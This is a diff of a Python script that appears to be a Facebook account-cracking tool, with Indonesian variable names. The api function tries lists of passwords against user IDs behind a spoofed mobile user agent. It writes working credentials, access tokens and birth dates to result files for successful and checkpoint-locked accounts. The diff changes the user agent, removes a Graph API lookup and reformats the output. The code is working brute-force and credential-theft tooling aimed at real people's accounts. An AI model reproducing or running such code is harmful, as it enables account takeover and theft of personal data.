@@ -1137,7 +1137,7 @@ def api(uid,pwx,loop):
 		try:
 			ua = open("user.txt","r").read()
 		except IOError:
-			ua = "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_0_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15"
+			ua = "Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE52-1/052.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.6.2 3gpp-gba"
 	ini_persen = float(loop)*100
 	persennya = float(ini_persen)/float(len(id))
 	persenku = str(persennya).split(".")
@@ -1199,10 +1199,7 @@ def api(uid,pwx,loop):
 					dett = jutt[0]+"."+jitt[0]+"m"
 			elif dutt>0 and dutt<60:
 				dett = ditt[0]+"d"
-	ttl = requests.get("https://graph.facebook.com/"+uid+"?access_token="+jihan)
-	goblokk = json.loads(ttl.text)
-	sanz = goblokk["id"]
-	print(s+"\r["+u+sanz+s+"] "+l+"%s/%s OK:%s CP:%s %s[%s%s%s] [%s%s%s]"%(loop,len(id),len(ok),len(cp),h,k,persen,h,k,dett,h), end=' ');sys.stdout.flush()
+	print(s+"\r{"+u+"Chan"+s+"} "+l+"%s/%s OK:%s CP:%s %s[%s%s%s] [%s%s%s]"%(loop,len(id),len(ok),len(cp),h,k,persen,h,k,dett,h), end=' ');sys.stdout.flush()
 	ses = requests.Session()
 	for pw in pwx:
 		try:
@@ -1224,11 +1221,11 @@ def api(uid,pwx,loop):
 						tahunnya = joined_year[4]
 					elif len(uid)==15:
 						tahunnya = joined_year[5]
-					print(u+"\rʕ"+u+"ok"+u+"ʔ"+h+" "+uid+k+" >< "+h+pw+k+" >< "+h+tahunnya+"          ")
+					print(h+"\r{"+k+"ok"+h+"}"+h+" "+uid+k+" >< "+h+pw+k+" >< "+h+tahunnya+"          ")
 					bts = open("Hasil_Ok/OK_%s.txt"%(hck),"a");bts.write(uid+">"+pw+"\n");bts.close()
 					ok.append(uid+"|"+pw)
 				else:
-					print(u+"\rʕ"+h+"ok"+u+"ʔ"+h+" "+uid+k+" >< "+h+pw+k+" >< "+h+response.json()["access_token"])
+					print(h+"\r{"+k+"ok"+h+"}"+h+" "+uid+k+" >< "+h+pw+k+" >< "+h+response.json()["access_token"])
 					bts = open("Hasil_Ok/OK_%s.txt"%(hck),"a");bts.write(uid+">"+pw+"\n");bts.close()
 					ok.append(uid+"|"+pw)
 				break
@@ -1256,30 +1253,30 @@ def api(uid,pwx,loop):
 						if len(lahir)==2:
 							nama_bulan = indah[int(lahir[0])]
 							if "old" in old_gak:
-								print(u+"\rʕ"+k+"cp"+u+"ʔ"+k+" "+uid+k+" >< "+l+pw+k+" >< "+l+lahir[1]+" "+nama_bulan+k+" >< "+l+tahunnya)
+								print(s+"\r{"+k+"cp"+s+"}"+l+" "+uid+k+" >< "+l+pw+k+" >< "+l+lahir[1]+" "+nama_bulan+k+" >< "+l+tahunnya)
 								bts = open("Hasil_Cp/CP_%s.txt"%(hck),"a");bts.write(uid+">"+pw+">"+lahir[1]+" "+nama_bulan+"\n");bts.close()
 								cp.append(uid+"|"+pw)
 							else:
-								print(u+"\rʕ"+k+"cp"+u+"ʔ"+k+" "+uid+k+" >< "+l+pw+k+" >< "+l+lahir[1]+" "+nama_bulan)
+								print(s+"\r{"+k+"cp"+s+"}"+l+" "+uid+k+" >< "+l+pw+k+" >< "+l+lahir[1]+" "+nama_bulan)
 								bts = open("Hasil_Cp/CP_%s.txt"%(hck),"a");bts.write(uid+">"+pw+">"+lahir[1]+" "+nama_bulan+"\n");bts.close()
 								cp.append(uid+"|"+pw)
 						else:
 							nama_bulan = indah[int(lahir[0])]
 							if "old" in old_gak:
-								print(u+"\rʕ"+k+"cp"+u+"ʔ"+k+" "+uid+k+" >< "+l+pw+k+" >< "+l+lahir[1]+" "+nama_bulan+" "+lahir[2]+k+" >< "+l+tahunnya)
+								print(s+"\r{"+k+"cp"+s+"}"+l+" "+uid+k+" >< "+l+pw+k+" >< "+l+lahir[1]+" "+nama_bulan+" "+lahir[2]+k+" >< "+l+tahunnya)
 								bts = open("Hasil_Cp/CP_%s.txt"%(hck),"a");bts.write(uid+">"+pw+">"+lahir[1]+" "+nama_bulan+" "+lahir[2]+"\n");bts.close()
 								cp.append(uid+"|"+pw)
 							else:
-								print(u+"\rʕ"+k+"cp"+u+"ʔ"+k+" "+uid+k+" >< "+l+pw+k+" >< "+l+lahir[1]+" "+nama_bulan+" "+lahir[2])
+								print(a+"\r{"+k+"cp"+s+"}"+l+" "+uid+k+" >< "+l+pw+k+" >< "+l+lahir[1]+" "+nama_bulan+" "+lahir[2])
 								bts = open("Hasil_Cp/CP_%s.txt"%(hck),"a");bts.write(uid+">"+pw+">"+lahir[1]+" "+nama_bulan+" "+lahir[2]+"\n");bts.close()
 								cp.append(uid+"|"+pw)
 					except (KeyError,IOError):
 						if "old" in old_gak:
-							print(u+"\rʕ"+k+"cp"+u+"ʔ"+k+" "+uid+u+" >< "+l+pw+u+" >< "+l+tahunnya+"          ")
+							print(s+"\r{"+k+"cp"+s+"}"+l+" "+uid+k+" >< "+l+pw+k+" >< "+l+tahunnya+"          ")
 							bts = open("Hasil_Cp/CP_%s.txt"%(hck),"a");bts.write(uid+">"+pw+"\n");bts.close()
 							cp.append(uid+"|"+pw)
 						else:
-							print(u+"\rʕ"+k+"cp"+u+"ʔ"+k+" "+uid+u+" >< "+l+pw+"          ")
+							print(s+"\r{"+k+"cp"+s+"}"+l+" "+uid+k+" >< "+l+pw+"          ")
 							bts = open("Hasil_Cp/CP_%s.txt"%(hck),"a");bts.write(uid+">"+pw+"\n");bts.close()
 							cp.append(uid+"|"+pw)
 				elif "munculkan" in opsit:
